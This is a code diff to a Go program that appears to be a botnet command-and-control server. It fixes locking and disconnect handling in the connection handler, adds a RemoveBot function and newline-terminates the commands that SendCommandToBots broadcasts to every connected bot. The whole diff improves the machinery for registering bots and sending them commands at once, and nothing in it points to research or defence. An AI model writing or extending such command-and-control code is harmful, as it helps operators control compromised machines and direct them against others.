@@ -24,11 +24,10 @@ func GetBots() int {
 func BotHandler(Connection net.Conn) {
 
 	BotMu.Lock()
-	defer BotMu.Unlock()
 
 	for _, Bot := range Bots {
 		if Bot.Addr == Connection.RemoteAddr().String() {
-			fmt.Print("bot attempted to duplicate connection so we close now\n")
+			BotMu.Unlock()
 			Connection.Close()
 			return
 		}
@@ -36,7 +35,18 @@ func BotHandler(Connection net.Conn) {
 
 	Bot := Bot{Addr: Connection.RemoteAddr().String(), Conn: Connection}
 	Bots = append(Bots, Bot)
-	go HandlerDisconnects(Bot)
+	BotMu.Unlock()
+
+	Buffer := make([]byte, 1)
+	for {
+		_, ERR := Connection.Read(Buffer)
+		if ERR != nil {
+			fmt.Print("bot disconnected\n")
+			RemoveBot(Bot.Addr)
+			Connection.Close()
+			return
+		}
+	}
 
 }
 
@@ -47,26 +57,20 @@ func SendCommandToBots(Command string) {
 
 	for _, Bot := range Bots {
 		Writer := bufio.NewWriter(Bot.Conn)
-		Writer.WriteString(Command)
+		Writer.WriteString(Command + "\n")
 		Writer.Flush()
 	}
 
 }
 
-func HandlerDisconnects(Bot Bot) {
+func RemoveBot(Address string) {
+	BotMu.Lock()
+	defer BotMu.Unlock()
 
-	for {
-		_, ERR := Bot.Conn.Write(make([]byte, 1))
-		if ERR != nil {
-			Bot.Conn.Close()
-			BotMu.Lock()
-			for B, Bot_ := range Bots {
-				if Bot_.Addr == Bot.Addr {
-					Bots = append(Bots[:B], Bots[B+1:]...)
-					break
-				}
-			}
-			BotMu.Unlock()
+	for i, Bot := range Bots {
+		if Bot.Addr == Address {
+			Bots = append(Bots[:i], Bots[i+1:]...)
+			return
 		}
 	}
 }
